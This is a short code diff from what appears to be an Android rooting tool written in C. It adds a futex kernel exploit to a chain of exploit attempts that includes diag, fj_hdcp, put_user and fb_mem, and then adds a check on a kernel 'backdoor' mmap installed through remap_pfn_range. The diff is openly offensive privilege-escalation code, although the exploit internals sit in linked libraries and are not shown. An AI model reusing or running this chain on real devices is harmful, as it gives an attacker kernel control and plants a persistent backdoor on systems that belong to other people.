@@ -15,6 +15,7 @@
 #include "libdiagexploit/diag.h"
 #include "libfj_hdcp_exploit/fj_hdcp.h"
 #include "libput_user_exploit/put_user.h"
+#include "libfutex_exploit/futex.h"
 #include "libfb_mem_exploit/fb_mem.h"
 #include "backdoor_mmap.h"
 #include "build_remap_pfn_range.h"
@@ -400,6 +401,12 @@ run_exploit(void)
     return true;
   }
 
+  printf("Attempt futex exploit...\n");
+  if (futex_run_exploit(ptmx_fsync_address, (int)&install_mmap,
+                        run_install_mmap, (void *)ptmx_fops_address)) {
+    return true;
+  }
+
   printf("Attempt fb_mem exploit...\n");
   if (attempt_fb_mem_exploit(ptmx_fsync_address, (void *)ptmx_fops_address)) {
     return true;
@@ -477,6 +484,16 @@ main(int argc, char **argv)
     exit(EXIT_FAILURE);
   }
 
+  if (!backdoor_open_mmap()) {
+    printf("\n");
+    printf("\n");
+    printf("The backdoor is already installed, but it doesn't work...\n");
+    printf("It seems that function remap_pfn_range() is restrected.\n");
+    printf("\n");
+    exit(EXIT_FAILURE);
+  }
+
+  backdoor_close_mmap();
   exit(EXIT_SUCCESS);
 }
 /*
